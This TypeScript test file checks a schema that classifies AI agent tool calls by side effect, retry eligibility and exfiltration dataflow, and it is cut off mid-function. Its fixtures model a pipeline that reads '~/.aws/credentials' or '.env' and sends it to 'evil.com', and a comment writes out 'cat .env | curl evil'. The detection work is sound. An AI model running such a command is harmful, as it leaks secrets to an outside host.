import * as fc from "fast-check";
import { describe, expect, it } from "vitest";
import { JUNK, assertRejects } from "../testing/property.js";
import {
  ClassifierConfidence,
  Composition,
  CompositionKind,
  EdgeRelation,
  EffectKind,
  EffectScope,
  RiskModifier,
  SIDE_EFFECT_LIMITS,
  SIDE_EFFECT_TAXONOMY_VERSION,
  SIDE_EFFECT_V1_NOT_MODELED,
  SideEffect,
  SideEffectTarget,
  TargetKind,
  TargetSensitivity,
  hasExfilDataflowPath,
  isRetryEligible,
  parseSideEffectCompat,
  type SideEffectT,
} from "./side-effect.js";

/** A known-valid atomic `SideEffect` (e.g. the `read` tool reading an in-workspace file). */
function makeValid(): SideEffectT {
  return {
    taxonomyVersion: SIDE_EFFECT_TAXONOMY_VERSION,
    staticCapability: { toolName: "read", effectEnvelope: ["fs_read"], broad: false },
    dynamic: {
      effectKinds: ["fs_read"],
      scopes: ["workspace"],
      targets: [
        {
          kind: "path",
          value: "src/index.ts",
          normalized: "/repo/src/index.ts",
          withinWorkspace: true,
          sensitivity: "internal",
        },
      ],
      modifiers: [],
      composition: {
        kind: "atomic",
        segments: [
          {
            effectKinds: ["fs_read"],
            scopes: ["workspace"],
            targets: [
              {
                kind: "path",
                value: "src/index.ts",
                normalized: "/repo/src/index.ts",
                withinWorkspace: true,
                sensitivity: "internal",
              },
            ],
            modifiers: [],
          },
        ],
        edges: [],
      },
      classifier: { name: "shell-classifier", version: "0.0.0", confidence: "exact", reasons: [] },
    },
  };
}

/** Two two-segment commands identical EXCEPT the edge relation — the exfil-distinction fixture. */
function makeCompound(relation: "pipe" | "conditional"): SideEffectT {
  const secretRead = {
    effectKinds: ["fs_read"] as const,
    scopes: ["home"] as const,
    targets: [
      {
        kind: "path" as const,
        value: "~/.aws/credentials",
        normalized: "/home/u/.aws/credentials",
        sensitivity: "secret" as const,
      },
    ],
    modifiers: [] as const,
  };
  const externalWrite = {
    effectKinds: ["network_write"] as const,
    scopes: ["external_service"] as const,
    targets: [
      { kind: "host" as const, value: "evil.com", normalized: "evil.com", withinWorkspace: false },
    ],
    modifiers: [] as const,
  };
  return {
    taxonomyVersion: SIDE_EFFECT_TAXONOMY_VERSION,
    staticCapability: {
      toolName: "bash",
      // canonical (sorted) — the schema's transform sorts effectEnvelope
      effectEnvelope: ["fs_read", "fs_write", "network_read", "network_write", "process_exec"],
      broad: true,
    },
    dynamic: {
      effectKinds: ["fs_read", "network_write"],
      scopes: ["external_service", "home"], // canonical (sorted) — see the canonicalizing transform
      targets: [...secretRead.targets, ...externalWrite.targets],
      modifiers: [],
      composition: {
        kind: relation === "pipe" ? "pipeline" : "conditional",
        segments: [
          {
            ...secretRead,
            effectKinds: [...secretRead.effectKinds],
            scopes: [...secretRead.scopes],
            targets: [...secretRead.targets],
            modifiers: [...secretRead.modifiers],
          },
          {
            ...externalWrite,
            effectKinds: [...externalWrite.effectKinds],
            scopes: [...externalWrite.scopes],
            targets: [...externalWrite.targets],
            modifiers: [...externalWrite.modifiers],
          },
        ],
        edges: [{ from: 0, to: 1, relation }],
      },
      classifier: {
        name: "shell-classifier",
        version: "0.0.0",
        confidence: "exact",
        reasons: ["secret_namespace"],
      },
    },
  };
}

describe("side-effect taxonomy schema (§4.8 / ADR-0024 revised; R1 2A format freeze)", () => {
  it("pins the frozen enum membership (a change here is a protocol change)", () => {
    expect(EffectKind.options).toEqual([
      "fs_read",
      "fs_write",
      "process_exec",
      "network_read",
      "network_write",
      "unknown",
    ]);
    expect(EffectScope.options).toEqual([
      "workspace",
      "home",
      "system",
      "temp",
      "network",
      "external_service",
      "process",
      "unknown",
    ]);
    expect(RiskModifier.options).toEqual(["destructive", "irreversible", "persistent", "unknown"]);
    expect(TargetKind.options).toEqual([
      "path",
      "host",
      "url",
      "command",
      "process",
      "package",
      "env_var",
      "unknown",
    ]);
    expect(TargetSensitivity.options).toEqual(["public", "internal", "secret", "unknown"]);
    expect(ClassifierConfidence.options).toEqual([
      "exact",
      "conservative",
      "ambiguous",
      "obfuscated",
      "unknown",
    ]);
    expect(EdgeRelation.options).toEqual([
      "pipe",
      "substitution",
      "redirect",
      "sequence",
      "conditional",
      "unknown",
    ]);
    expect(CompositionKind.options).toEqual([
      "atomic",
      "pipeline",
      "sequence",
      "conditional",
      "substitution",
      "mixed",
      "unknown",
    ]);
    expect(SIDE_EFFECT_TAXONOMY_VERSION).toBe("side-effect-taxonomy/v1");
  });

  it("round-trips the documented atomic shape", () => {
    const v = makeValid();
    expect(SideEffect.parse(v)).toEqual(v);
  });

  it("preserves composition structure so exfil is distinguishable from a benign sequence", () => {
    const piped = makeCompound("pipe");
    const sequenced = makeCompound("conditional");
    // Both parse and carry the IDENTICAL flat effect bag...
    expect(SideEffect.parse(piped)).toEqual(piped);
    expect(SideEffect.parse(sequenced)).toEqual(sequenced);
    expect(piped.dynamic.effectKinds).toEqual(sequenced.dynamic.effectKinds);
    expect(piped.dynamic.scopes).toEqual(sequenced.dynamic.scopes);
    // ...yet the structure distinguishes the dataflow: `cat .env | curl evil` exfiltrates,
    // `cat .env && curl evil` does not (the curl never receives the secret).
    expect(hasExfilDataflowPath(piped)).toBe(true);
    expect(hasExfilDataflowPath(sequenced)).toBe(false);
  });

  it("computes retry-eligibility per the multi-axis predicate (amends ADR-0028)", () => {
    expect(isRetryEligible(makeValid())).toBe(true); // fs_read / workspace / no modifiers / exact

    const tempRead = makeValid();
    tempRead.dynamic.scopes = ["temp"];
    tempRead.dynamic.composition.segments[0]!.scopes = ["temp"];
    expect(isRetryEligible(tempRead)).toBe(true);

    // each disqualifier independently makes it non-retryable
    const networked = makeValid();
    networked.dynamic.effectKinds = ["fs_read", "network_read"];
    networked.dynamic.composition.segments[0]!.effectKinds = ["fs_read", "network_read"];
    expect(isRetryEligible(networked)).toBe(false);

    const outOfScope = makeValid();
    outOfScope.dynamic.scopes = ["home"];
    outOfScope.dynamic.composition.segments[0]!.scopes = ["home"];
    expect(isRetryEligible(outOfScope)).toBe(false);

    const withModifier = makeValid();
    withModifier.dynamic.modifiers = ["destructive"];
    withModifier.dynamic.composition.segments[0]!.modifiers = ["destructive"];
    expect(isRetryEligible(withModifier)).toBe(false);

    const unsure = makeValid();
    unsure.dynamic.classifier.confidence = "obfuscated";
    expect(isRetryEligible(unsure)).toBe(false);

    const secretRead = makeValid();
    secretRead.dynamic.targets[0] = {
      kind: "path",
      value: ".env",
      normalized: "/repo/.env",
      withinWorkspace: true,
      sensitivity: "secret",
    };
    secretRead.dynamic.composition.segments[0]!.targets[0] = {
      kind: "path",
      value: ".env",
      normalized: "/repo/.env",
      withinWorkspace: true,
      sensitivity: "secret",
    };
    expect(isRetryEligible(secretRead)).toBe(false);

    // fail CLOSED on a degenerate / schema-bypassed record — empty arrays must NOT be vacuously
    // retry-eligible (QC F4). isRetryEligible is contracted on SideEffectT but must not fail open.
    const degenerate = makeValid();
    degenerate.dynamic.effectKinds = [];
    expect(isRetryEligible(degenerate)).toBe(false);

    // QC re-review (F4 fail-open): a target with UNKNOWN sensitivity (undetermined / coerced from a
    // newer minor) must NOT read as safe; nor may an UNKNOWN-kind (unresolved) target.
    const unknownSensitivity = makeValid();
    unknownSensitivity.dynamic.targets[0]!.sensitivity = "unknown";
    unknownSensitivity.dynamic.composition.segments[0]!.targets[0]!.sensitivity = "unknown";
    expect(isRetryEligible(unknownSensitivity)).toBe(false);

    const unknownKind = makeValid();
    const u = { kind: "unknown" as const, value: "?", sensitivity: "internal" as const };
    unknownKind.dynamic.targets = [u];
    unknownKind.dynamic.composition.segments[0]!.targets = [u];
    expect(isRetryEligible(unknownKind)).toBe(false);

    // QC re-review round 3: read-only retry must be affirmatively resolved to a concrete
    // filesystem resource. Empty or semantically irrelevant target bags must not pass by omission.
    const emptyTargets = makeValid();
    emptyTargets.dynamic.targets = [];
    emptyTargets.dynamic.composition.segments[0]!.targets = [];
    expect(isRetryEligible(SideEffect.parse(emptyTargets))).toBe(false);

    const commandOnlyTarget = makeValid();
    const commandTarget = { kind: "command" as const, value: "cat" };
    commandOnlyTarget.dynamic.targets = [commandTarget];
    commandOnlyTarget.dynamic.composition.segments[0]!.targets = [commandTarget];
    expect(isRetryEligible(SideEffect.parse(commandOnlyTarget))).toBe(false);

    const hostOnlyTarget = makeValid();
    const hostTarget = {
      kind: "host" as const,
      value: "example.com",
      normalized: "example.com",
      withinWorkspace: false,
    };
    hostOnlyTarget.dynamic.targets = [hostTarget];
    hostOnlyTarget.dynamic.composition.segments[0]!.targets = [hostTarget];
    expect(isRetryEligible(SideEffect.parse(hostOnlyTarget))).toBe(false);

    const futureTarget = makeValid() as unknown as {
      taxonomyVersion: string;
      dynamic: {
        targets: unknown[];
        composition: { segments: Array<{ targets: unknown[] }> };
      };
    };
    const credentialVault = {
      kind: "credential_vault",
      value: "prod/db",
      sensitivity: "top_secret",
    };
    futureTarget.taxonomyVersion = "side-effect-taxonomy/v1.2";
    futureTarget.dynamic.targets = [credentialVault];
    futureTarget.dynamic.composition.segments[0]!.targets = [credentialVault];
    const parsedFutureTarget = parseSideEffectCompat(futureTarget);
    expect(parsedFutureTarget.dynamic.targets[0]).toMatchObject({
      kind: "unknown",
      sensitivity: "unknown",
    });
    expect(isRetryEligible(parsedFutureTarget)).toBe(false);
  });

  it("requires sensitivity on path/env_var targets (normative; freeze sanity-check #1)", () => {
    expect(SideEffectTarget.safeParse({ kind: "path", value: ".env" }).success).toBe(false);
    expect(
      SideEffectTarget.safeParse({ kind: "env_var", value: "AWS_SECRET_ACCESS_KEY" }).success,
    ).toBe(false);
    expect(
      SideEffectTarget.safeParse({ kind: "path", value: ".env", sensitivity: "secret" }).success,
    ).toBe(true);
    // sensitivity stays optional for non-fs targets
    expect(SideEffectTarget.safeParse({ kind: "host", value: "example.com" }).success).toBe(true);
    expect(SideEffectTarget.safeParse({ kind: "command", value: "chmod" }).success).toBe(true);
  });

  it("rejects an edge referencing a non-existent segment — both endpoints + the boundary index", () => {
    const oneSeg = [
      { effectKinds: ["fs_read"], scopes: ["workspace"], targets: [], modifiers: [] },
    ];
    const bad = (edge: unknown): boolean =>
      Composition.safeParse({ kind: "pipeline", segments: oneSeg, edges: [edge] }).success;
    expect(bad({ from: 0, to: 5, relation: "pipe" })).toBe(false); // bad `to`
    expect(bad({ from: 5, to: 0, relation: "pipe" })).toBe(false); // bad `from` (kills M5)
    expect(bad({ from: 0, to: 1, relation: "pipe" })).toBe(false); // boundary: index == length (kills M6)
    expect(bad({ from: 1, to: 0, relation: "pipe" })).toBe(false); // boundary `from`
    // a genuinely in-range edge across two segments parses
    expect(
      Composition.safeParse({
        kind: "pipeline",
        segments: [
          ...oneSeg,
          {
            effectKinds: ["network_write"],
            scopes: ["external_service"],
            targets: [],
            modifiers: [],
          },
        ],
        edges: [{ from: 0, to: 1, relation: "pipe" }],
      }).success,
    ).toBe(true);
  });

  it("rejects an aggregate that disagrees with its segments", () => {
    const kindMismatch = makeValid();
    kindMismatch.dynamic.effectKinds = ["fs_write"]; // segments say fs_read
    expect(SideEffect.safeParse(kindMismatch).success).toBe(false);

    const scopeMismatch = makeValid();
    scopeMismatch.dynamic.scopes = ["system"]; // segments say workspace
    expect(SideEffect.safeParse(scopeMismatch).success).toBe(false);

    const modMismatch = makeValid();
    modMismatch.dynamic.modifiers = ["irreversible"]; // segments say []
    expect(SideEffect.safeParse(modMismatch).success).toBe(false);

    // UNDER-statement: aggregate is a strict SUBSET of the segment union (kills mutant M10 — the
    // prior disjoint-set cases passed via the subset half alone; this proves the size check too).
    const understate = makeValid();
    understate.dynamic.composition.segments[0]!.effectKinds = ["fs_read", "fs_write"];
    understate.dynamic.effectKinds = ["fs_read"]; // missing fs_write
    expect(SideEffect.safeParse(understate).success).toBe(false);
  });

  it("rejects malformed records (JUNK + schema-specific)", () => {
    const wrongVersion = makeValid();
    (wrongVersion as { taxonomyVersion: string }).taxonomyVersion = "side-effect-taxonomy/v2";

    const emptyKinds = makeValid();
    emptyKinds.dynamic.effectKinds = [];

    const emptyScopes = makeValid();
    emptyScopes.dynamic.composition.segments[0]!.scopes = [];

    const emptySegments = makeValid();
    emptySegments.dynamic.composition.segments = [];

    const badEnum = makeValid();
    (badEnum.dynamic.effectKinds as unknown as string[]) = ["frobnicate"];

    const emptyEnvelope = makeValid();
    emptyEnvelope.staticCapability.effectEnvelope = [];

    const extraKey = makeValid() as unknown as Record<string, unknown>;
    extraKey["surprise"] = true;

    const fractionalEdge = makeCompound("pipe");
    fractionalEdge.dynamic.composition.edges = [
      { from: 0.5, to: 1, relation: "pipe" },
    ] as unknown as never;

    const missingClassifier = makeValid() as unknown as { dynamic: Record<string, unknown> };
    delete missingClassifier.dynamic["classifier"];

    assertRejects(SideEffect, [
      ...JUNK,
      wrongVersion,
      emptyKinds,
      emptyScopes,
      emptySegments,
      badEnum,
      emptyEnvelope,
      extraKey,
      fractionalEdge,
      missingClassifier,
    ]);
  });

  it("round-trips populated extensions and rejects non-JSON-safe extensions (QC F2/F5)", () => {
    const withExt = makeValid();
    (withExt as { extensions?: unknown }).extensions = { "vendor.x": { note: "hi", n: 1 } };
    const parsed = SideEffect.parse(withExt);
    expect(SideEffect.parse(JSON.parse(JSON.stringify(parsed)))).toEqual(parsed);
    // NaN/±Infinity/undefined cannot ride extensions across the audit hash wire (JsonObject rejects)
    const nanExt = makeValid();
    (nanExt as { extensions?: unknown }).extensions = { bad: Number.NaN };
    expect(SideEffect.safeParse(nanExt).success).toBe(false);
  });

  it("canonicalizes set-like arrays + edges so reordered/duplicated-but-equal records are identical (hash-stable; QC F1/F6)", () => {
    const a = makeCompound("pipe"); // already canonical
    const b = makeCompound("pipe");
    b.dynamic.effectKinds = ["network_write", "fs_read"]; // reversed
    b.dynamic.scopes = ["home", "external_service"]; // reversed
    b.dynamic.composition.edges = [
      { from: 0, to: 1, relation: "pipe" },
      { from: 0, to: 1, relation: "pipe" }, // duplicate
    ];
    const pa = SideEffect.parse(a);
    const pb = SideEffect.parse(b);
    expect(pb).toEqual(pa); // semantically-equal inputs canonicalize to the SAME record → same hash
    expect(pa.dynamic.effectKinds).toEqual(["fs_read", "network_write"]); // sorted
    expect(pa.dynamic.scopes).toEqual(["external_service", "home"]); // sorted
    expect(pb.dynamic.composition.edges).toHaveLength(1); // deduped
  });

  it("property: well-formed classifications round-trip (parse-idempotent + JSON-wire-safe)", () => {
    fc.assert(
      fc.property(arbSideEffect(), (value) => {
        const parsed = SideEffect.parse(value);
        expect(SideEffect.parse(parsed)).toEqual(parsed);
        const wire = JSON.parse(JSON.stringify(parsed)) as unknown;
        expect(SideEffect.parse(wire)).toEqual(parsed);
      }),
      { numRuns: 200 },
    );
  });
});

describe("R1 QC re-review hardening (drift / fail-open / DoS)", () => {
  it("F1: rejects top-level targets that drift from the segment union (closes the fail-open seam)", () => {
    // a secret present in a SEGMENT but omitted from the advisory top-level bag a policy reads (POL-001)
    const hidden = makeCompound("pipe");
    hidden.dynamic.targets = hidden.dynamic.targets.filter((t) => t.sensitivity !== "secret");
    expect(SideEffect.safeParse(hidden).success).toBe(false);

    // a top-level target that no segment actually touches (over-statement)
    const extra = makeCompound("pipe");
    extra.dynamic.targets = [
      ...extra.dynamic.targets,
      {
        kind: "path",
        value: "/ghost",
        normalized: "/ghost",
        withinWorkspace: false,
        sensitivity: "internal",
      },
    ];
    expect(SideEffect.safeParse(extra).success).toBe(false);
  });

  it("F1: target identity is collision-resistant and top-level is DERIVED from segments (QC re-review)", () => {
    // two DISTINCT path targets whose values contain spaces/quotes — a delimiter-join risked collapsing
    // them; JSON keys keep them distinct. Provided top-level is in a DIFFERENT order and is overwritten
    // by the segment-derived union, so a crafted provided bag cannot win.
    const a = {
      kind: "path" as const,
      value: 'a "b',
      normalized: "/r/a",
      withinWorkspace: true,
      sensitivity: "internal" as const,
    };
    const b = {
      kind: "path" as const,
      value: "a",
      normalized: '/r/"b',
      withinWorkspace: true,
      sensitivity: "internal" as const,
    };
    const r = makeValid();
    r.dynamic.effectKinds = ["fs_read"];
    r.dynamic.scopes = ["workspace"];
    r.dynamic.targets = [b, a]; // provided order differs from the segment
    r.dynamic.composition.segments = [
      { effectKinds: ["fs_read"], scopes: ["workspace"], targets: [a, b], modifiers: [] },
    ];
    const parsed = SideEffect.parse(r);
    expect(parsed.dynamic.targets).toHaveLength(2); // not collision-merged
    expect(parsed.dynamic.targets).toEqual([a, b]); // derived from segments (segment order), not [b, a]
  });

  it("F1: canonicalizes top-level targets to the deduped segment union (policy may trust dynamic.targets)", () => {
    const t = {
      kind: "path" as const,
      value: ".env",
      normalized: "/repo/.env",
      withinWorkspace: true,
      sensitivity: "secret" as const,
    };
    const dup = makeValid();
    dup.dynamic.effectKinds = ["fs_read"];
    dup.dynamic.scopes = ["workspace"];
    dup.dynamic.targets = [t, t];
    dup.dynamic.composition.segments = [
      { effectKinds: ["fs_read"], scopes: ["workspace"], targets: [t], modifiers: [] },
      { effectKinds: ["fs_read"], scopes: ["workspace"], targets: [t], modifiers: [] },
    ];
    const parsed = SideEffect.parse(dup);
    expect(parsed.dynamic.targets).toHaveLength(1); // deduped — drift is structurally impossible
    expect(parsed.dynamic.targets[0]!.sensitivity).toBe("secret");
  });

  it("F6: requires `normalized` on path/host/url targets at EVERY confidence (no low-confidence exemption)", () => {
    // QC re-review: the earlier exemption depended on policy reviewing `ambiguous` — a behavioral
    // assumption. The frozen format requires normalized structurally, regardless of confidence.
    for (const confidence of [
      "exact",
      "conservative",
      "ambiguous",
      "obfuscated",
      "unknown",
    ] as const) {
      const r = makeValid();
      r.dynamic.classifier.confidence = confidence;
      delete (r.dynamic.targets[0] as { normalized?: string }).normalized;
      delete (r.dynamic.composition.segments[0]!.targets[0] as { normalized?: string }).normalized;
      expect(SideEffect.safeParse(r).success, confidence).toBe(false);
    }
  });

  it("F6: does not require normalized on non-containment targets (command/env_var/package/process)", () => {
    const cmd = { kind: "command" as const, value: "chmod" };
    const r = makeValid();
    r.dynamic.effectKinds = ["process_exec"];
    r.dynamic.scopes = ["process"];
    r.dynamic.targets = [cmd];
    r.dynamic.composition.segments = [
      { effectKinds: ["process_exec"], scopes: ["process"], targets: [cmd], modifiers: [] },
    ];
    expect(SideEffect.safeParse(r).success).toBe(true);
  });

  it("caps array sizes so a hostile audit-import record cannot exhaust the parser (trust-before-parse)", () => {
    const overSegments = makeValid();
    overSegments.dynamic.targets = [];
    overSegments.dynamic.composition.segments = Array.from(
      { length: SIDE_EFFECT_LIMITS.maxSegments + 1 },
      () => ({
        effectKinds: ["fs_read"] as const,
        scopes: ["workspace"] as const,
        targets: [],
        modifiers: [],
      }),
    ) as never;
    expect(SideEffect.safeParse(overSegments).success).toBe(false);

    const overEdges = makeCompound("pipe");
    overEdges.dynamic.composition.edges = Array.from(
      { length: SIDE_EFFECT_LIMITS.maxEdges + 1 },
      () => ({ from: 0, to: 1, relation: "pipe" as const }),
    );
    expect(SideEffect.safeParse(overEdges).success).toBe(false);

    const overReasons = makeValid();
    overReasons.dynamic.classifier.reasons = Array.from(
      { length: SIDE_EFFECT_LIMITS.maxReasons + 1 },
      () => "r",
    );
    expect(SideEffect.safeParse(overReasons).success).toBe(false);

    const many = Array.from({ length: SIDE_EFFECT_LIMITS.maxTargets + 1 }, (_, i) => ({
      kind: "path" as const,
      value: `f${i}`,
      normalized: `/r/f${i}`,
      sensitivity: "internal" as const,
    }));
    const overTargets = makeValid();
    overTargets.dynamic.targets = many;
    overTargets.dynamic.composition.segments[0]!.targets = many;
    expect(SideEffect.safeParse(overTargets).success).toBe(false);
  });

  it("names the v1 not-modeled scope boundary as an explicit, tested disclosure (honesty over coverage)", () => {
    expect(SIDE_EFFECT_V1_NOT_MODELED.length).toBeGreaterThan(0);
    // the headline disclosed gaps are named (the exfil derivation does NOT cover these by design)
    expect(SIDE_EFFECT_V1_NOT_MODELED as readonly string[]).toContain("file_mediated_dataflow");
    expect(SIDE_EFFECT_V1_NOT_MODELED as readonly string[]).toContain("variable_laundering");
  });
});

/**
 * Builds a self-consistent (top-level == segment union) secret→external `SideEffect` as a freely-shaped
 * `unknown` — values are NOT enum-checked, so a newer minor's members can be injected to simulate a
 * forward-version producer for the F4 lenient reader.
 */
function newerSecretToExternal(opts: {
  version: string;
  relation?: string;
  extraScopeOnSink?: string;
  modifierOnSource?: string;
  compositionKind?: string;
  confidence?: string;
  extraEffectKindOnSource?: string;
  sourceTargetKind?: string;
  sourceSensitivity?: string;
}): unknown {
  const src = {
    effectKinds: [
      "fs_read",
      ...(opts.extraEffectKindOnSource ? [opts.extraEffectKindOnSource] : []),
    ],
    scopes: ["home"],
    targets: [
      {
        kind: opts.sourceTargetKind ?? "path",
        value: "~/.aws/credentials",
        normalized: "/home/u/.aws/credentials",
        sensitivity: opts.sourceSensitivity ?? "secret",
      },
    ] as unknown[],
    modifiers: opts.modifierOnSource ? [opts.modifierOnSource] : [],
  };
  const sink = {
    effectKinds: ["network_write"],
    scopes: ["external_service", ...(opts.extraScopeOnSink ? [opts.extraScopeOnSink] : [])],
    targets: [
      { kind: "host", value: "evil.com", normalized: "evil.com", withinWorkspace: false },
    ] as unknown[],
    modifiers: [] as string[],
  };
  const segs = [src, sink];
  const union = (k: "effectKinds" | "scopes" | "modifiers"): string[] => [
    ...new Set(segs.flatMap((s) => s[k])),
  ];
  return {
    taxonomyVersion: opts.version,
    staticCapability: {
      toolName: "bash",
      effectEnvelope: ["fs_read", "network_write"],
      broad: true,
    },
    dynamic: {
      effectKinds: union("effectKinds"),
      scopes: union("scopes"),
      modifiers: union("modifiers"),
      targets: segs.flatMap((s) => s.targets),
      composition: {
        kind: opts.compositionKind ?? "pipeline",
        segments: segs,
        edges: [{ from: 0, to: 1, relation: opts.relation ?? "pipe" }],
      },
      classifier: { name: "c", version: "1", confidence: opts.confidence ?? "exact", reasons: [] },
    },
  };
}

describe("F4 forward-compatibility (lenient minor-version reader)", () => {
  it("every frozen enum carries a fail-closed `unknown` member (the coercion target)", () => {
    for (const e of [
      EffectKind,
      EffectScope,
      RiskModifier,
      TargetKind,
      TargetSensitivity,
      ClassifierConfidence,
      CompositionKind,
      EdgeRelation,
    ]) {
      expect(e.options as readonly string[]).toContain("unknown");
    }
  });

  it("strict parse refuses an unrecognized enum value (never guesses)", () => {
    const newer = newerSecretToExternal({
      version: "side-effect-taxonomy/v1.1",
      extraEffectKindOnSource: "network_listen",
    });
    expect(SideEffect.safeParse(newer).success).toBe(false);
  });

  it("lenient reader coerces a newer-minor unknown enum value to fail-closed `unknown` (never silently trusted)", () => {
    const parsed = parseSideEffectCompat(
      newerSecretToExternal({
        version: "side-effect-taxonomy/v1.2",
        extraEffectKindOnSource: "network_listen",
      }),
    );
    expect(parsed.dynamic.effectKinds).toContain("unknown");
    expect(parsed.dynamic.effectKinds as readonly string[]).not.toContain("network_listen");
    expect(parsed.taxonomyVersion).toBe("side-effect-taxonomy/v1.2"); // honest provenance
    expect(isRetryEligible(parsed)).toBe(false); // unknown effect kind ⇒ non-retryable
  });

  it("coerces unknown members on every axis (modifier / edge / composition-kind / confidence / scope)", () => {
    const parsed = parseSideEffectCompat(
      newerSecretToExternal({
        version: "side-effect-taxonomy/v1.5",
        modifierOnSource: "quantum",
        relation: "telepathy",
        compositionKind: "hypergraph",
        confidence: "vibes",
        extraScopeOnSink: "orbit",
      }),
    );
    expect(parsed.dynamic.modifiers).toEqual(["unknown"]);
    expect(parsed.dynamic.composition.edges[0]!.relation).toBe("unknown");
    expect(parsed.dynamic.composition.kind).toBe("unknown");
    expect(parsed.dynamic.classifier.confidence).toBe("unknown");
    expect(parsed.dynamic.scopes).toContain("unknown");
    expect(isRetryEligible(parsed)).toBe(false);
  });

  it("keeps future-minor unknown target data fail-closed for retry and exfil, then round-trips stably", () => {
    const parsed = parseSideEffectCompat(
      newerSecretToExternal({
        version: "side-effect-taxonomy/v1.9",
        modifierOnSource: "quantum_modifier",
        relation: "telepathy",
        compositionKind: "hypergraph",
        confidence: "vibes",
        extraScopeOnSink: "orbit",
        extraEffectKindOnSource: "network_listen",
        sourceTargetKind: "credential_vault",
        sourceSensitivity: "top_secret",
      }),
    );

    expect(parsed.dynamic.effectKinds).toContain("unknown");
    expect(parsed.dynamic.scopes).toContain("unknown");
    expect(parsed.dynamic.modifiers).toEqual(["unknown"]);
    expect(parsed.dynamic.composition.kind).toBe("unknown");
    expect(parsed.dynamic.composition.edges[0]!.relation).toBe("unknown");
    expect(parsed.dynamic.classifier.confidence).toBe("unknown");
    expect(parsed.dynamic.composition.segments[0]!.targets[0]).toMatchObject({
      kind: "unknown",
      sensitivity: "unknown",
    });
    expect(isRetryEligible(parsed)).toBe(false);
    expect(hasExfilDataflowPath(parsed)).toBe(true);
    expect(SideEffect.parse(parsed)).toEqual(parsed);
  });

  it("treats an unknown EDGE relation as data-carrying so exfil stays conservative (fail-closed)", () => {
    const parsed = parseSideEffectCompat(
      newerSecretToExternal({ version: "side-effect-taxonomy/v1.3", relation: "quantum_tunnel" }),
    );
    expect(parsed.dynamic.composition.edges[0]!.relation).toBe("unknown");
    expect(hasExfilDataflowPath(parsed)).toBe(true);
  });

  it("accepts only canonical version spellings so hashed taxonomyVersion bytes are unique (F4)", () => {
    for (const version of ["side-effect-taxonomy/v1", "side-effect-taxonomy/v1.10"]) {
      expect(SideEffect.safeParse(newerSecretToExternal({ version })).success, version).toBe(true);
      expect(
        () => parseSideEffectCompat(newerSecretToExternal({ version })),
        version,
      ).not.toThrow();
    }

    for (const version of [
      "side-effect-taxonomy/v1.0",
      "side-effect-taxonomy/v01",
      "side-effect-taxonomy/v1.01",
      "side-effect-taxonomy/v10",
      "side-effect-taxonomy/v0",
      "side-effect-taxonomy/v00",
      "side-effect-taxonomy/v1.",
      "side-effect-taxonomy/v1.0.0",
      "side-effect-taxonomy/v1 ",
      "side-effect-taxonomy/v1\n",
    ]) {
      expect(SideEffect.safeParse(newerSecretToExternal({ version })).success, version).toBe(false);
      expect(() => parseSideEffectCompat(newerSecretToExternal({ version })), version).toThrow();
    }
  });

  it("rejects a different MAJOR version, and an unparseable version, as semantic breaks", () => {
    expect(() =>
      parseSideEffectCompat(newerSecretToExternal({ version: "side-effect-taxonomy/v2" })),
    ).toThrow();
    expect(() => parseSideEffectCompat(newerSecretToExternal({ version: "garbage" }))).toThrow();
  });

  it("parses a same/lower-minor record strictly (no coercion) — an unknown value there is malformed", () => {
    const v1 = newerSecretToExternal({ version: "side-effect-taxonomy/v1" });
    expect(parseSideEffectCompat(v1)).toEqual(SideEffect.parse(v1));
    expect(() =>
      parseSideEffectCompat(
        newerSecretToExternal({
          version: "side-effect-taxonomy/v1",
          extraEffectKindOnSource: "network_listen",
        }),
      ),
    ).toThrow();
  });

  it("a structurally-broken newer-minor record still fails closed (defensive coercion guards)", () => {
    const v = "side-effect-taxonomy/v1.2";
    const ok = {
      classifier: { name: "c", version: "1", confidence: "exact", reasons: [] },
      staticCapability: { toolName: "bash", effectEnvelope: ["fs_read"], broad: true },
    };
    const broken: unknown[] = [
      // staticCapability + dynamic absent → both coercion branches skip; strict parse rejects
      { taxonomyVersion: v },
      // dynamic present but its sub-fields are the WRONG TYPE → coercion leaves them; strict parse rejects
      {
        taxonomyVersion: v,
        staticCapability: 5,
        dynamic: {
          effectKinds: "x",
          scopes: "x",
          modifiers: "x",
          targets: "x",
          classifier: 5,
          composition: 5,
        },
      },
      // composition present but its arrays are the wrong type
      {
        taxonomyVersion: v,
        ...ok,
        dynamic: {
          effectKinds: ["fs_read"],
          scopes: ["workspace"],
          modifiers: [],
          targets: [],
          classifier: ok.classifier,
          composition: { kind: "atomic", segments: "x", edges: "x" },
        },
      },
      // arrays present but elements the wrong type (non-object target / segment / edge)
      {
        taxonomyVersion: v,
        ...ok,
        dynamic: {
          effectKinds: ["fs_read"],
          scopes: ["workspace"],
          modifiers: [],
          targets: [5],
          classifier: ok.classifier,
          composition: { kind: "atomic", segments: [5], edges: [5] },
        },
      },
      // an object segment whose `targets` is the wrong type (non-array)
      {
        taxonomyVersion: v,
        ...ok,
        dynamic: {
          effectKinds: ["fs_read"],
          scopes: ["workspace"],
          modifiers: [],
          targets: [],
          classifier: ok.classifier,
          composition: {
            kind: "atomic",
            segments: [
              { effectKinds: ["fs_read"], scopes: ["workspace"], targets: "x", modifiers: [] },
            ],
            edges: [],
          },
        },
      },
    ];
    for (const b of broken) expect(() => parseSideEffectCompat(b)).toThrow();
    // a non-object input has no version → strict path → rejected (fails closed, not coerced)
    expect(() => parseSideEffectCompat(42)).toThrow();
    expect(() => parseSideEffectCompat(null)).toThrow();
  });
});

/** A fast-check arbitrary that builds VALID `SideEffect`s (the schema's refines make the generic
 * zod-fast-check generator impractical, so we construct aggregate↔segment-consistent instances). */
function arbSideEffect(): fc.Arbitrary<unknown> {
  const kind = fc.constantFrom(...EffectKind.options);
  const scope = fc.constantFrom(...EffectScope.options);
  const modifier = fc.constantFrom(...RiskModifier.options);
  const sensitivity = fc.constantFrom(...TargetSensitivity.options);
  const nonEmpty = <T>(a: fc.Arbitrary<T>) => fc.array(a, { minLength: 1, maxLength: 3 });

  const target: fc.Arbitrary<unknown> = fc
    .record({
      kind: fc.constantFrom(...TargetKind.options),
      value: fc.string(),
      normalized: fc.option(fc.string(), { nil: undefined }),
      withinWorkspace: fc.option(fc.boolean(), { nil: undefined }),
      sensitivity: fc.option(sensitivity, { nil: undefined }),
    })
    .map((t) => {
      let out: Record<string, unknown> = t;
      // honor the normative refine: path/env_var must carry sensitivity
      if ((t.kind === "path" || t.kind === "env_var") && t.sensitivity === undefined) {
        out = { ...out, sensitivity: "unknown" as const };
      }
      // honor F6: path/host/url containment targets must carry `normalized` (kept unconditional here
      // so the property holds at every confidence the arb may pick)
